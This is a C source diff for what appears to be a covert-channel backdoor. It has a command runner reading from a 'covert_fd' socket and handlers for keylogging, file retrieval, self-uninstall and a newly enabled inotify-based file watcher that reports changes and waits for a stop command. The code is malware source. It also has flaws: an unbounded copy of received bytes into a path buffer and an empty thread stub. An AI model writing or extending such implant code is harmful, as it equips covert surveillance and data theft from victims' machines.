@@ -15,8 +15,12 @@
 #include <sys/socket.h>
 #include <sys/time.h>
 #include <unistd.h>
+#include <pthread.h>
+#include <poll.h>
+#include <sys/inotify.h>
 
 #define DATA_BUF_SIZE 8192
+#define STD_SIZE 256
 
 void print_blob(struct Blob *blob) {
     printf("Data1: %u\n", blob->data1);
@@ -45,7 +49,6 @@ void print_list(struct List *list) {
 }
 
 void free_list(struct List *list) {
-    printf("Freeing list\n");
     struct Blob *curr = list->head;
 
     while (curr != NULL) {
@@ -63,6 +66,9 @@ int runner_recv(struct Context *ctx, struct List *list) {
 
         ssize_t ret = recv(ctx->covert_fd, buffer, BUF_SIZE, 0);
         if (ret < 0) {
+            if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                return 0;  // no data available (normal for nonblocking)
+            }
             fprintf(stderr, "recv error\n");
             close(ctx->covert_fd);
             return -1;
@@ -169,7 +175,7 @@ int runner(struct Context *ctx) {
                 break;
             case CMD_START_WATCH_FILE:
                 printf("Start watch file command received\n");
-                // cmd_start_watch_file(ctx, &cmd_list);
+                cmd_start_watch_file(ctx, &cmd_list);
                 break;
             case CMD_START_WATCH_DIR:
                 printf("Start watch directory command received\n");
@@ -201,9 +207,8 @@ int cmd_req_file_name(struct Context *ctx, struct List *list) {
     // encode, send data (rep_req_file_data)
     // send TERM
 
-    const int PATH_SIZE = 256;
-    char file_path[PATH_SIZE];
-    memset(file_path, 0, PATH_SIZE);
+    char file_path[STD_SIZE];
+    memset(file_path, 0, STD_SIZE);
 
     char *ptr = file_path;
     struct Blob *curr = list->head;
@@ -321,6 +326,96 @@ int cmd_start_kl(struct Context *ctx) {
 
     // might need a strong wait here
     close(file_fd);
+
+    return 0;
+}
+
+typedef struct {
+    struct Context *ctx;
+    struct pollfd *fds;
+} watch_file_args;
+
+static void watch_file_thread(void *args) {
+    watch_file_args *arg = args;
+
+
+}
+
+int cmd_start_watch_file(struct Context *ctx, struct List *list) {
+    char file_path[PATH_MAX] = {0};
+
+    char *ptr = file_path;
+    struct Blob *curr = list->head;
+    while (curr) {
+        // Only copy non-null bytes
+        if (curr->data1 != 0) *ptr++ = curr->data1;
+        if (curr->data2 != 0) *ptr++ = curr->data2;
+        curr = curr->next;
+    }
+    *ptr = '\0';
+
+    printf("Starting watch file: %s\n", file_path);
+
+    int inotify_fd = inotify_init1(IN_NONBLOCK);
+    if (inotify_fd < 0) {
+        perror("inotify_init1");
+        return -1;
+    }
+
+    struct pollfd fds[1];
+
+    fds[0].fd = inotify_fd;
+    fds[0].events = POLLIN;
+
+    char buf[DATA_BUF_SIZE];
+    int running = 1;
+
+    while (running) {
+        printf("polling\n");
+        fds[0].revents = 0;
+        int ret = poll(fds, 1, 3000);
+
+        if (ret < 0) {
+            perror("poll");
+            break;
+        }
+
+        if (fds[0].revents & POLLIN) {
+            printf("File event detected\n");
+            ssize_t len = read(inotify_fd, buf, sizeof(buf));
+            if (len <= 0) continue;
+
+            ssize_t i = 0;
+
+            while (i < len) {
+                struct inotify_event *event =
+                    (struct inotify_event *)&buf[i];
+
+                if (event->mask & IN_MODIFY)
+                    printf("File modified\n");
+
+                if (event->mask & IN_DELETE_SELF) {
+                    printf("File deleted\n");
+                    running = 0;
+                }
+
+                if (event->mask & IN_MOVE_SELF)
+                    printf("File moved\n");
+
+                i += sizeof(struct inotify_event) + event->len;
+            }
+        }
+
+        struct List stop_list = {0};
+        runner_recv(ctx, &stop_list);
+        if (stop_list.type == CMD_STOP) {
+            running = 0;
+            free_list(&stop_list);
+            return 0;
+        }
+        free_list(&stop_list);
+
+    }
 
     return 0;
 }
@@ -449,7 +544,7 @@ int cmd_uninstall(struct Context *ctx) {
 FILE *open_file_from_list(struct List *list) {
     if (list == NULL) return NULL;
 
-    char filename[256];
+    char filename[STD_SIZE];
     int i = 0;
 
     struct Blob *curr = list->head->next;
